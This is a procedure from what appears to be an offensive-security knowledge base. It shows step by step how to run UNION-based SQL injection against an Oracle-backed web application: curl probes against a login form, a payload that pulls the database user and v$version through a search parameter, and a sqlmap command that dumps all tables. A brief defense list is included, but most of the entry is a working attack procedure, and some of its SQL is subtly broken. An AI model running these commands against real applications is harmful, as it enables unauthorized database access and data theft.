---
type: procedure
description: >-
  This procedure uses SQL injection to extract the current database user and
  Oracle version information from a vulnerable web application connected to an
  Oracle database.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[System Information Discovery]]'
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - oracle
  - sqli
  - database-discovery
  - version-enumeration
commands:
  - '[[commands/curl-oracle-sqli-injection]]'
platforms:
  - Web
  - Oracle Database
tools:
  - '[[tools/sqlmap]]'
  - '[[tools/Burp-Suite]]'
validated: true
---

# Oracle-SQL-Injection-User-and-Version-Retrieval

## Summary

This procedure exploits a SQL injection vulnerability in a web application backed by an Oracle database to retrieve the current database user and version information. By injecting a crafted UNION-based SQL payload, attackers can enumerate sensitive system details that aid in further exploitation, such as identifying unpatched versions for targeted attacks.

## Description

SQL injection in Oracle databases occurs when user-supplied input is not properly sanitized and is concatenated into SQL queries, allowing attackers to manipulate the query structure. This procedure targets numeric or string-based injection points to append a UNION SELECT statement that queries the 'dual' table for the current user and the 'v$version' view for database version details. This information reveals the Oracle edition, release, and component versions, which can be used to research known vulnerabilities (e.g., via CVE databases). The technique is commonly applied during reconnaissance phases of database attacks, assuming the application exposes a vulnerable parameter like a search field or login form. Success depends on the injection point allowing UNION operations and bypassing any basic filters.

## Requirements

1. A vulnerable web application with a SQL injection point connected to an Oracle database (e.g., via JDBC).
2. Network access to the target application (e.g., HTTP/HTTPS endpoint).
3. Tools for manual injection testing, such as curl for command-line requests or Burp Suite for interception.
4. Basic knowledge of Oracle SQL syntax and web request manipulation.
5. Optional: sqlmap for automated payload testing.

## Defense

- Implement prepared statements and parameterized queries in application code to separate SQL logic from user input.
- Use web application firewalls (WAFs) with Oracle-specific SQLi rules to detect and block UNION-based payloads.
- Enable database auditing for suspicious queries accessing system views like v$version.
- Regularly apply Oracle security patches and use tools like Oracle Database Vault to restrict access to sensitive views.
- Validate and sanitize all user inputs, limiting database privileges for application accounts to least-privilege principles.

## Objectives

1. Identify and confirm a SQL injection vulnerability in the target application.
2. Extract the current database user context to understand privilege levels.
3. Retrieve Oracle database version details for vulnerability research.
4. Validate the injection without disrupting the application.

## Instructions

### Step 1: Identify the Injection Point

**Context**: Locate a parameter vulnerable to SQL injection by testing for error-based or boolean-based responses. Common points include search forms, login fields, or URL parameters. Use error messages to confirm Oracle as the backend (e.g., ORA- errors).

**Command** ([[commands/curl-oracle-sqli-injection]]):

Use a basic probe to test for injection:

```bash
curl -X POST "http://target.com/login" -d "username=admin' AND 1=1--" -v
```

> This sends a tautology test (' AND 1=1--) to check if the query alters behavior. If the response differs from a false condition (e.g., ' AND 1=2--), injection is likely. Expected output: Normal login page or success response for true condition, error or denial for false.

### Step 2: Craft and Inject the Payload

**Context**: Once confirmed, inject the UNION payload to retrieve user and version info. The payload balances columns with the original query (assume a single-column original for simplicity; adjust based on error messages). Use the 'dual' table for user and 'v$version' for version, closing with comments to ignore trailing query parts.

**Code** ([[codes/Oracle-SQLi-User-and-Version-Query]]):

Embed the payload in the vulnerable parameter:

```sql
SELECT user FROM dual UNION SELECT * FROM v$version
```

**Command** ([[commands/curl-oracle-sqli-injection]]):

Inject via POST or GET:

```bash
curl -X GET "http://target.com/search?id=1' UNION SELECT user FROM dual UNION SELECT banner FROM v$version--" -v
```

> Replace 'id' with the vulnerable parameter. The payload uses 'banner' from v$version for concise version info. Expected output: Response body includes user (e.g., "SYS") and version strings (e.g., "Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production"), blended into legitimate results. If column count mismatches, adjust by adding NULLs (e.g., UNION SELECT NULL, user FROM dual).

### Step 3: Verify and Extract Results

**Context**: Parse the response for the injected data. If automated, use sqlmap for dumping. Confirm no alerts in application logs.

**Command** ([[commands/curl-oracle-sqli-injection]]):

For extraction with sqlmap (if tool available):

```bash
sqlmap -u "http://target.com/search?id=1" --dbms=oracle --technique=U --union-cols=5 --dump-all
```

> This automates UNION testing and dumps tables/views. Expected output: sqlmap console shows enumerated user/version, saved to files like dump/oracle/tables.csv. Manually, grep response for Oracle version patterns (e.g., "ORA-" or "Production").
